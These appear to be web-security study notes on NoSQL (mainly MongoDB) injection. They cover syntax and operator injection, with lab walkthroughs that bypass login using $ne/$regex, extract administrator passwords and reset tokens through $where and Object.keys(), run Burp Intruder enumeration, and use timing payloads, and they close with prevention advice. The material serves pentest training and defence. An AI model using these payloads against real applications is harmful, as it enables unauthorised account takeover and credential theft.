# NoSQL Injection

NoSQL injection is a vulnerability where an attacker can interfere with the queries an application makes to a NoSQL database to perform actions such as bypassing authentication, extracting or editing data, causing denial of service, or executing code on the server.

Characteristics of NoSQL databases

* NoSQL databases store and retrieve data in formats other than traditional SQL relational tables.
* They use a wide range of query languages (JSON, XML) instead of a single universal standard like SQL.
* They have fewer relational constraints and consistency checks than SQL databases.
* They are designed to handle large volumes of unstructured or semi-structured data.

NoSQL database models

{% stepper %}
{% step %}
### Document stores

* Store data in flexible, semi-structured documents.
* Use formats such as JSON, BSON and XML.
* Queried via an API or query language.
* Examples: MongoDB (most popular), Couchbase
{% endstep %}

{% step %}
### Key-value stores

* Store data in a key-value format.
* Each data field is associated with a unique key string.
* Values are retrieved based on the unique key.
* Examples: Redis, Amazon DynamoDB
{% endstep %}

{% step %}
### Wide-column stores

* Organize related data into flexible column families rather than traditional rows.
* Examples: Apache Cassandra, Apache HBase
{% endstep %}

{% step %}
### Graph databases

* Use nodes to store data entities and edges to store relationships between entities.
* Examples: Neo4j, Amazon (graph offerings)
{% endstep %}
{% endstepper %}

Types of NoSQL injection

* Syntax injection
  * Occurs when you can break the NoSQL query syntax to inject your own payload.
* Operator injection
  * Occurs when you can inject NoSQL query operators to manipulate queries.

NoSQL syntax injection

* Detect by attempting to break the query syntax.
* Test inputs by submitting fuzz strings and special characters that trigger database errors or change behavior.
* Check the target API/query language and use fuzz strings relevant to that language.
* Use varied fuzz strings to target multiple API languages.

Detecting syntax injection in MongoDB

Example scenario:

* Application displays products in categories. Selecting Fizzydrink results in:
  * https://insecure-website.com/product/lookup?category=fizzy
* Application sends a JSON query to MongoDB: this.category == fizzy

Test:

* Submit a fuzz string in the category parameter, e.g.
  * ``'"`{;$Foo}$Foo \xYZ``
*   URL-encoded example:

    * ```
      ```

    https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00

    ```
    ```
* If the response changes from the original, input may not be filtered/sanitised correctly.
* Notes:
  * Some applications may cause a validation error rather than executing the injected query.
  * Sometimes you must inject via a JSON property rather than a URL parameter, e.g.:
    * ``'\"`{\r;$Foo}\n$Foo \\xYZ\u0000``

Determining which characters are processed

* Inject individual characters to see which are interpreted as syntax.
* Example: sending `'` might lead to a MongoDB query like:
  * `this.category == '''`
* If response changes, the `'` character broke the query syntax.
* Confirm by escaping the quote:
  * `this.category == '\''`
* If that still causes a syntax error, the application may be vulnerable to injection.

Confirming conditional behaviour

* After detecting a vulnerability, attempt to influence boolean conditions using NoSQL syntax.
* Send two requests:
  *   False condition:

      * ```
        ```

      https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x \`\`\` (i.e. `' && 0 && 'x`)
  *   True condition:

      * ```
        ```

      https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x \`\`\` (i.e. `' && 1 && 'x`)
* If application behaves differently, the injected condition impacts server-side query logic.

Overriding existing conditions

* Inject a JavaScript condition that always evaluates to true:
  * `'||1||'`
  *   URL-encoded example:

      * ```
        ```

      https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%31%7c%7c%27

      ```
      ```
* This can modify a MongoDB query like:
  * `this.category == 'fizzy'||'1'=='1'`
* Result: the modified query returns all items, possibly revealing hidden/unreleased products.

Lab: Detecting NoSQL injection

{% stepper %}
{% step %}
### Lab - Introduction

* Target: Web\_Pentest500 — product category filter powered by MongoDB.
{% endstep %}

{% step %}
### Vulnerability - Problem

* Pen-tester searches for vulnerable targets. The product filter can be vulnerable to NoSQL injection.
{% endstep %}

{% step %}
### Payload & End-goal

* Goal: cause the application to display unreleased products.
* Example payloads: `'` , `'&& 0 && 'x` , `'&& 1 && 'x` , `'||1||'`
{% endstep %}

{% step %}
### Reconnaissance-Plan

* Click a product filter and proxy the request to Burp:
  * Proxy > HTTP history > Send to Repeater.
* Submit `'` in the category parameter; if a JavaScript syntax error occurs, input is not sanitised.
* Submit a valid JavaScript payload (e.g. `Gifts'+'` URL-encoded).
  * If no error occurs, server-side injection likely occurred.
{% endstep %}

{% step %}
### Attack

* Check boolean condition by inserting:
  * False: `Gifts' && 0 && 'x`
  * True: `Gifts' && 1 && 'x`
* URL-encode payloads and observe responses.
{% endstep %}

{% step %}
### Exploit & Enumerate

* Submit a condition that always evaluates to true:
  * `Gifts'||1||'`
* Show response in browser and verify the response contains unreleased products.
{% endstep %}

{% step %}
### Notes

* You can add a null character after the category value. MongoDB may ignore everything after a null character:
  *   Example:

      * ```
        ```

      https://insecure-website.com/product/lookup?category=fizzy'%00

      ```
      ```
  * Resulting query:
    * `this.category == 'fizzy'\u0000' && this.released == 1`
* This may bypass additional restrictions such as `this.released == 1`.
{% endstep %}
{% endstepper %}

NoSQL operator injection

* NoSQL databases use operators to specify conditions. MongoDB operators include:
  * $where — matches documents that satisfy a JavaScript expression
  * $ne — matches values not equal to a specified value
  * $in — matches values specified in an array
  * $regex — selects documents where values match a regular expression
* You may be able to inject operators into user inputs to manipulate queries. Systematically submit different operators and review responses and errors.

Submitting query operators

* In JSON messages: insert nested objects as query operators:
  * `{"username":"wiener"}` → `{"username":{"$ne":"invalid"}}`
* For URL-based inputs: insert query operators via URL parameters:
  * `username=wiener` → `username[$ne]=invalid`

Other options:

1. Convert request method from GET to POST.
2. Change Content-Type header to application/json.
3. Add JSON to message body.
4. Inject query operators in JSON.

Note: You can use tools (e.g., Content Type Converter) to convert URL-encoded POST requests to JSON automatically.

Detecting operator injection in MongoDB

* Example: application accepts username and password in POST body:
  * `{"username":"wiener","password":"peter"}`
* Test inputs with operators to see whether they are processed:
  * `{"username":{"$ne":"invalid"},"password":{"peter"}}`
* If $ne is applied to both username and password:
  * `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`
  * This may return the first user in the collection and allow authentication bypass.
* Targeted payload:
  * `{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`

Lab: Exploiting NoSQL operator injection to bypass authentication

{% stepper %}
{% step %}
### Lab - Introduction

* Target: Web\_Pentest501 — login function powered by MongoDB.
{% endstep %}

{% step %}
### Vulnerability - Problem

* The login endpoint may be vulnerable to NoSQL operator injection.
{% endstep %}

{% step %}
### Payload & End-goal

* Goal: login as the administrator user.
* Example payloads: `{"$ne":""}`, `{"$regex":"wien.*"}`, `{"$regex":"admin.*"}`
{% endstep %}

{% step %}
### Reconnaissance-Plan

* Proxy login as normal user wiener:peter. Send POST /Login to Repeater.
* Test username and password parameters:
  * Change username to `{"$ne":""}` and send — this may allow login.
  * Change username to `{"$regex":"wien.*"}` — may also allow login.
  * Set both username and password to `{"$ne":""}` to see expected records.
{% endstep %}

{% step %}
### Attack

* With password set to `{"$ne":""}`, change username to `{"$regex":"admin.*"}` and send.
{% endstep %}

{% step %}
### Exploit & Enumerate

* If successful, you will be logged in as admin. Use the response (show in browser) to confirm/continue.
{% endstep %}
{% endstepper %}

Exploiting syntax injection to extract data

* Some operators/functions run JavaScript (e.g., $where, mapReduce). If a vulnerable application uses these, the database may evaluate injected JavaScript, enabling extraction of data.

Exfiltrating data in MongoDB

* Example: lookup other registered usernames and display their role:
  * `https://insecure-website.com/user/lookup?username=admin`
* Query: `{"$where":"this.username == 'admin'"}`
* Because $where runs JavaScript, you may craft injections to reveal password characters:
  * Example payloads:
    * `admin' && this.password[0] == 'a' || 'a'=='b` — tests first character.
    * `admin' && this.password.match(/\d/) || 'a'=='b` — tests for a digit using match().

Lab: Exploiting NoSQL injection to extract data

{% stepper %}
{% step %}
### Lab - Introduction

* Target: Web\_Pentest502 — lookup function powered by MongoDB.
{% endstep %}

{% step %}
### Vulnerability - Problem

* The lookup function is vulnerable to NoSQL injection using operators and JavaScript functions.
{% endstep %}

{% step %}
### Payload & End-goal

* Goal: extract the administrator password to log in.
{% endstep %}

{% step %}
### Reconnaissance-Plan

* Log in as a normal user (user:peter).
* Proxy GET /user/lookup?user=user to Repeater.
* Submit `'` in the user parameter; if an error occurs, input not filtered.
* Submit `user'+'` (URL-encoded) — if account details for user are returned, server-side injection is confirmed.
{% endstep %}

{% step %}
### Attack

* Test boolean injections:
  * False: `user'&& '1'=='2` — expect "could not find user".
  * True: `user'&& '1'=='1` — expect account details.
* Identify password length:
  * Try: `administrator' && this.password.length < 30 || 'a'=='b`
  * Reduce until condition becomes false to find actual length (example found length = 8).
* Send request to Intruder for automated enumeration.
{% endstep %}

{% step %}
### Exploit & Enumerate

* Use Intruder (Cluster bomb) to enumerate characters:
  * Payload template: `administrator' && this.password[§0§]=='§a§`
  * Payload set 1: numbers 0–7 (positions).
  * Payload set 2: letters a–z.
* Start attack and identify payloads that evaluate to true to reconstruct the password.
* Login as the administrator with the enumerated password.
{% endstep %}
{% endstepper %}

Identifying field names

* MongoDB schemas are semi-structured; you may need to identify valid field names.
*   Example approach: test whether a field exists using JavaScript injection:

    * ```
      ```

    https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'

    ```
    - For an existing field:
      - `admin' && this.username!='` — expect response identical to existing field username.
    - For a non-existent field:
      - `admin' && this.foo!='` — expect a different response.
    ```
* Use a wordlist to cycle through potential field names.
* Note: You can also extract field names character-by-character via operator injection (see next section).

Exploiting NoSQL operator injection to extract data

* Inject operators yourself if the application doesn't use any, then test using boolean conditions evaluated in JavaScript.

Injecting operators in MongoDB

* Example POST body: `{"username":"wiener","password":"peter"}`
* Add a $where parameter:
  * Condition true: `{"username":"wiener","password":"peter", "$where":"0"}`
  * Condition false: `{"username":"wiener","password":"peter", "$where":"1"}`
* Differences in responses confirm JavaScript evaluation in $where.

Extracting field names

* If JavaScript execution is possible, use Object.keys() to extract field names character-by-character:
  *   Example $where:

      * ```
        ```

      "$where":"Object.keys(this)\[0].match('^.{0}a.\*')"

      ```
      ```
  * This inspects the first data field name and checks its first character.

Lab: Exploiting NoSQL operator injection to extract unknown fields

{% stepper %}
{% step %}
### Lab - Introduction

* Target: Web\_Pentest502 — lookup function powered by MongoDB.
{% endstep %}

{% step %}
### Vulnerability - Problem

* Vulnerable to operator injection and Object.keys() JavaScript techniques.
{% endstep %}

{% step %}
### Payload & End-goal

* Goal: extract the administrator's password or identify sensitive fields (e.g., password reset token).
{% endstep %}

{% step %}
### Reconnaissance-Plan

* Attempt login with known username (e.g., carlos/invalid) to observe "invalid username or password".
* Send POST /Login to Repeater. Change password to `{"$ne":"invalid"}` — if you see "account locked", $ne is processed.
* Test JavaScript via $where:
  * `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}` — invalid username/password.
  * `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "1"}` — account locked (indicates JS evaluated).
* Send request to Intruder for enumeration.
{% endstep %}

{% step %}
### Attack

* Construct $where to identify field names:
  *   Example:

      * ```
        ```

      "$where":"Object.keys(this)\[1].match('^.{}.\*')"

      ```
      ```
  * Use two payload positions:
    * Payload 1: character position (0..20).
    * Payload 2: possible characters (a–z, A–Z, 0–9).
  * Cluster bomb attack:
    * Payload set 1: numbers 0–20.
    * Payload set 2: characters to test.
* Start attack and sort results to find responses with "Account locked" vs "invalid username or password".
* Characters from payload 2 spell the parameter names (e.g., username).
* Increment the index (Object.keys(this)\[2], etc.) to enumerate more fields.
{% endstep %}

{% step %}
### Exploit & Enumerate

* Test exfiltrated field names as query parameters on endpoints (e.g., GET /forgot-password?YOURTOKENNAME=invalid).
* If response differs, you've identified a correct token name and endpoint.
* Use Intruder cluster bomb to extract the password reset token value:
  *   Update $where to:

      * ```
        ```

      "$where":"this.YOURTOKENNAME.match('^.{§§}§§.\*')"

      ```
      ```
  * Start attack and sort results to reconstruct token characters.
* Use the token in GET /forgot-password?YOURTOKENNAME=TOKENVALUE, follow browser session flow to reset password and log in.
{% endstep %}
{% endstepper %}

Exfiltrating using operators (non-JS)

* Operators such as $regex can be used to extract data character-by-character without JavaScript.
* Example POST with $regex:
  * Test if $regex is processed:
    * `{"username":"admin","password":{"$regex":"^.*"}}`
  * If response differs from incorrect password, $regex may be processed.
  * Use $regex to extract characters:
    * `{"username":"admin","password":{"$regex":"^a*"}}`

Timing-based injection

* If errors don’t affect responses, you may detect/exploit via timing differences using JavaScript.
* Steps:
  1. Load page multiple times to establish baseline.
  2. Insert timing payloads that delay responses when a condition is true.
     * Example: `{"$where": "sleep(5000)"}` (causes 5000 ms delay if executed).
  3. Measure response time differences to infer successful injection or boolean conditions.
*   Example conditional timing payloads:

    * ```
      ```

    admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password\[0]==="a") && waitTill > new Date()){};}(this)+'

    ````
    - or
    - ```
    admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
    ````

Preventing NoSQL injection

* Read security documentation for your chosen NoSQL database.
* Sanitize and validate user input; use an allowlist of accepted characters.
* Use parameterized queries instead of concatenating user input directly into queries.
* To prevent operator injection, apply an allowlist of accepted keys.
